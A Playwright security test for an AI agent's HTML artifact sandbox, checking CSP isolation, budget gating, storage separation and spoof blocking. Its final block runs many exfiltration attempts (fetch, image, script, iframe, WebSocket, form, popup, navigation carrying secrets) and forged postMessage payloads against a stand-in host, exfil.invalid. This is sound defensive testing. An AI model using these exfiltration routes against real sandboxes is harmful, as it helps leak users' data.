import assert from 'node:assert/strict';
import { build } from 'esbuild';
import { mkdir, writeFile } from 'node:fs/promises';
import { resolve } from 'node:path';
import { chromium } from 'playwright';
import { loader } from '../private-agent-artifacts/server.ts';

const evidence = resolve(process.env.EVIDENCE || 'local-data/artifacts');
await mkdir(evidence, { recursive: true });
const pi = resolve('node_modules/@earendil-works/pi-web-ui/dist');
const output = await build({ stdin: { contents: `
import {createArtifacts} from './artifacts.mjs'; import {ArtifactState} from './artifact-state.mjs';
const records = new Map(); window.records=records;
const state=new ArtifactState({dataKey:btoa(String.fromCharCode(...new Uint8Array(32).fill(7))),getRecord:scope=>records.get(scope),saveRecord:(scope,envelope)=>records.set(scope,envelope)});
const models={grant:async(scope,limit)=>{await state.update(scope,record=>{if(record.budget.limitNanoUsd!==null)throw Error('Already granted');record.budget.limitNanoUsd=limit});return (await state.read(scope)).budget},complete:async(scope,params)=>{const record=await state.read(scope);if(record.budget.limitNanoUsd===null)throw Object.assign(Error('Choose an app budget in the host bar'),{code:'NOT_AVAILABLE'});if(params.messages[0].content==='slow'){window.slowStarted=true;await new Promise(resolve=>setTimeout(resolve,31000))}return {text:'answer:'+params.messages[0].content,model:'test-model',usage:{},evidence:{}}}};
const x=createArtifacts(undefined,{state,models,credit:{address:'public-wallet',signer:{privateKey:'NEVER_EXPOSE'},chatCredit:{remainingNanoUsd:'100000000',spentNanoUsd:'1'}},scopeForFilename:filename=>JSON.stringify(['chat-a',filename])});document.body.append(x.budgetBar,x.panel);window.artifacts=x;
`, resolveDir: process.cwd() }, bundle:true,format:'esm',write:false,alias:{'@pi-components':pi},loader:{'.md':'text'} });
const host='https://private-agent.dstack.soc1024.com', sandbox='https://artifacts.private-agent.dstack.soc1024.com';
const browser=await chromium.launch({headless:true,executablePath:process.env.CHROMIUM_PATH,args:['--no-sandbox']});
const page=await browser.newPage();
await page.clock.install();
const outgoing=[], errors=[];
page.on('pageerror', e=>errors.push(String(e)));
await page.route('**/*',async route=>{
  const url=route.request().url();
  if(url===host+'/')return route.fulfill({contentType:'text/html',headers:{'content-security-policy':`default-src 'none'; script-src 'self'; style-src 'unsafe-inline'; frame-src ${sandbox}`},body:'<body><script type="module" src="/test.js"></script>'});
  if(url===host+'/test.js')return route.fulfill({contentType:'text/javascript',body:output.outputFiles[0].text});
  // The shared webhost strips response security headers. The early loader meta
  // policy must supply the floor inherited by the generated blob document.
  if(url===sandbox+'/loader.html')return route.fulfill({contentType:'text/html',body:loader});
  outgoing.push(url);return route.abort();
});
try {
  await page.goto(host+'/');await page.waitForFunction(()=>window.artifacts);
  const html=`<!doctype html><html><head><style>body{background:white;color:black}</style></head><body><parsererror hidden>&lt;img src="https://exfil.invalid/fallback"&gt;</parsererror><button id="count">0</button><script>document.querySelector('button').onclick=e=>e.target.textContent=Number(e.target.textContent)+1;console.log('runtime-ready');</script></body></html>`;
  await page.evaluate(async html=>window.artifacts.tool.execute('create1',{command:'create',filename:'test.html',content:html}),html);
  let app=page.frames().find(f=>f.url().startsWith('blob:'));
  assert.ok(app,'artifact renders in a blob iframe');
  const acknowledgement = await app.evaluate(() => Promise.race([
    window.sendRuntimeMessage({type:'console',method:'log',text:'acknowledgement-probe'}),
    new Promise((_,reject)=>setTimeout(()=>reject(new Error('Console acknowledgement missing after 2s')),2000)),
  ]));
  assert.equal(acknowledgement.success,true,'console request receives the source-bound host acknowledgement');
  const sdk = await app.evaluate(async () => {
    await dsmack.ready();
    await dsmack.storage.put('sdk-key',{secret:'BROWSER_ONLY_ARTIFACT_STATE'});
    await dsmack.diagnostics.log('sdk-diagnostics');
    let denied;
    try { await dsmack.agent.complete({messages:[{role:'user',content:'before-grant'}]}); } catch(error) { denied=error.code; }
    return {frozen:Object.isFrozen(dsmack)&&Object.isFrozen(dsmack.storage),hasStorage:dsmack.capabilities.has('storage.get'),
      value:await dsmack.storage.get('sdk-key'),keys:await dsmack.storage.list(),credit:await dsmack.credit.balance(),denied};
  });
  assert.ok(sdk.frozen&&sdk.hasStorage);
  assert.deepEqual(sdk.value,{secret:'BROWSER_ONLY_ARTIFACT_STATE'});
  assert.deepEqual(sdk.keys,['sdk-key']);
  assert.equal(sdk.denied,'NOT_AVAILABLE');
  assert.ok(!JSON.stringify(sdk.credit).includes('NEVER_EXPOSE'));
  assert.equal(await page.evaluate(()=>JSON.stringify([...records.values()]).includes('BROWSER_ONLY_ARTIFACT_STATE')),false);
  await page.getByRole('button',{name:'Allow app budget'}).click();
  await page.waitForFunction(()=>document.querySelector('.artifact-budget').textContent.includes('Limit $0.020000'));
  assert.match(await page.locator('.artifact-budget').textContent(),/Limit \$0\.020000/);
  assert.equal(await app.evaluate(async()=>(await dsmack.agent.complete({messages:[{role:'user',content:'after-grant'}]})).text),'answer:after-grant');
  const slow=app.evaluate(()=>dsmack.agent.complete({messages:[{role:'user',content:'slow'}]}));
  await page.waitForFunction(()=>window.slowStarted);
  await page.clock.fastForward(31000);
  assert.equal((await slow).text,'answer:slow','model response survives the upstream Pi 30s timeout');
  await app.locator('#count').click();assert.equal(await app.locator('#count').textContent(),'1');
  await page.screenshot({path:resolve(evidence,'artifacts.png')});
  const logs=()=>page.evaluate(async()=>JSON.stringify(await window.artifacts.tool.execute('logs',{command:'logs',filename:'test.html'})));
  assert.match(await logs(),/runtime-ready/);
  assert.match(await logs(),/sdk-diagnostics/);
  await page.evaluate(()=>window.postMessage({sandboxId:'artifact-test.html',type:'console',method:'log',text:'forged-console'},'*'));
  await page.evaluate(()=>window.postMessage({sandboxId:'artifact-test.html',type:'dsmack-request',version:1,requestId:'spoof',method:'storage.put',params:{key:'unauthorized',value:true}},'*'));
  await page.evaluate(async()=>window.artifacts.tool.execute('create2',{command:'create',filename:'other.html',content:`<script>parent.parent.postMessage({sandboxId:'artifact-test.html',type:'console',method:'log',text:'forged-console'},'*');parent.postMessage({sandboxId:'artifact-test.html',type:'console',method:'log',text:'forged-console'},'*');</script>`}));
  await page.waitForTimeout(50);assert.doesNotMatch(await logs(),/forged-console/);
  const other=page.frames().find(f=>f.url().startsWith('blob:')&&f!==app);
  assert.equal(await other.evaluate(async()=>{await dsmack.ready();return dsmack.storage.get('sdk-key')}),null,'other filename cannot read this app state');
  assert.equal(await app.evaluate(()=>dsmack.storage.get('unauthorized')),null,'unbound host messages cannot mutate artifact state');
  for (const frame of page.frames()) if (frame.url().startsWith('blob:') && await frame.locator('#count').count()) app=frame;
  const denied=await page.evaluate(async()=>{try{await window.artifacts.tool.execute('svg',{command:'create',filename:'evil.svg',content:'<svg/>'});return false}catch{return true}});
  assert.ok(denied,'non-HTML never reaches the trusted parent renderer');
  // Every request below is a concrete exfiltration route. The HTTP CSP inherited
  // by the blob must block them before any request reaches the network handler.
  await app.evaluate(async ({sandbox})=>{
    document.open();document.write('<button id="after-write">After write</button>');document.close();
    fetch('https://exfil.invalid/fetch').catch(()=>{});
    const image=new Image();image.src='https://exfil.invalid/image';document.body.append(image);
    const script=document.createElement('script');script.src='https://exfil.invalid/script';document.head.append(script);
    const link=document.createElement('link');link.rel='stylesheet';link.href='https://exfil.invalid/css';document.head.append(link);
    const frame=document.createElement('iframe');frame.src='https://exfil.invalid/frame';document.body.append(frame);
    try{new WebSocket('wss://exfil.invalid/socket')}catch{}
    const form=document.createElement('form');form.action='https://exfil.invalid/form';document.body.append(form);form.submit();
    window.open('https://exfil.invalid/popup');
    parent.postMessage({type:'open-external-url',url:'https://exfil.invalid/bridge'},'*');
    try{parent.location.href=sandbox+'/loader.html?secret=parent'}catch{}
    try{top.location.href=sandbox+'/loader.html?secret=top'}catch{}
    location.href=sandbox+'/loader.html?secret=must-not-leave';
  },{sandbox});
  await page.waitForTimeout(250);
  assert.deepEqual(outgoing,[],'deny network includes navigation back to the loader origin');
  assert.equal(page.frames().filter(f=>f.url()===sandbox+'/loader.html').length,2,'trusted loaders remain isolated');
  assert.deepEqual(errors,[]);
  await writeFile(resolve(evidence,'results.json'),JSON.stringify({runtime:true,console:true,sdk:true,encryptedStorage:true,budgetGrant:true,modelResponseBeyond30s:true,spoofBlocked:true,htmlOnly:true,networkBlocked:true,outgoing,errors},null,2));
  console.log('Artifact runtime, console source binding, HTML-only renderer and deny-network boundaries passed');
} finally {await browser.close();}
